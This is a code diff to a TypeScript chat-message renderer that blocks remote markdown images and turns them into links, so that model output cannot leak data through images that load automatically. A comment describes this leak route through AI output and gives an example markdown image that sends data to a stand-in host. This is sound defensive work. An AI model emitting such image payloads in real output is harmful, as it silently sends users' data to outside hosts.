@@ -30,8 +30,10 @@ import {
 } from "react";
 import remarkBreaks from "remark-breaks";
 import {
+  defaultRehypePlugins,
   Streamdown,
   type PluginConfig,
+  type StreamdownProps,
 } from "streamdown";
 import { mdComponents } from "@/components/md-blocks";
 import { repairMathForDisplay, transformMathDelimiters } from "@/src/core";
@@ -361,6 +363,50 @@ export const streamdownPlugins = {
 // separate sanitization/hardening and all other Markdown repairs stay enabled.
 export const streamdownRemend = { htmlTags: false };
 
+// Model output and imported documents must not load remote images: a rendered
+// ![x](https://host/?d=...) sends data out with no click. Streamdown's
+// default harden step allows every image prefix, so this keeps its
+// raw → sanitize → harden pipeline and sets allowedImagePrefixes to [], which
+// blocks every <img> that markdown can produce. Before that step, an image
+// to another site becomes a link (its alt text, else its address) that the
+// learner can open: Streamdown's link button asks before it navigates. The
+// app's own images (figures, drawings, photos, page images) are separate
+// <img> elements that do not render through markdown. data: images are
+// already blocked by the sanitize step.
+type HastNode = { type: string; tagName?: string; properties?: Record<string, unknown>; children?: HastNode[] };
+
+function imageToLink(root: HastNode): void {
+  const walk = (node: HastNode) => {
+    node.children?.forEach((child, i) => {
+      if (child.type === "element" && child.tagName === "img") {
+        const src = String(child.properties?.src ?? "");
+        if (/^https?:\/\//i.test(src)) {
+          const alt = String(child.properties?.alt ?? "").trim();
+          node.children![i] = {
+            type: "element",
+            tagName: "a",
+            properties: { href: src },
+            children: [{ type: "text", value: alt || src } as HastNode],
+          };
+          return;
+        }
+      }
+      walk(child);
+    });
+  };
+  walk(root);
+}
+
+const [hardenPlugin, hardenOptions] = defaultRehypePlugins.harden as [unknown, Record<string, unknown>];
+// Spreading keeps `harden` in its original slot (after sanitize), so
+// imageToLink is inserted explicitly in front of it.
+const { harden: _harden, ...beforeHarden } = defaultRehypePlugins;
+export const streamdownRehypePlugins = [
+  ...Object.values(beforeHarden),
+  () => imageToLink,
+  [hardenPlugin, { ...hardenOptions, allowedImagePrefixes: [] }],
+] as NonNullable<StreamdownProps["rehypePlugins"]>;
+
 export const MessageResponse = memo(
   ({ className, children, ...props }: MessageResponseProps) => {
     // Legacy backslash delimiters are converted in a single linear scan;
@@ -381,6 +427,7 @@ export const MessageResponse = memo(
         )}
         components={mdComponents}
         plugins={streamdownPlugins}
+        rehypePlugins={streamdownRehypePlugins}
         remend={streamdownRemend}
         {...props}
       >
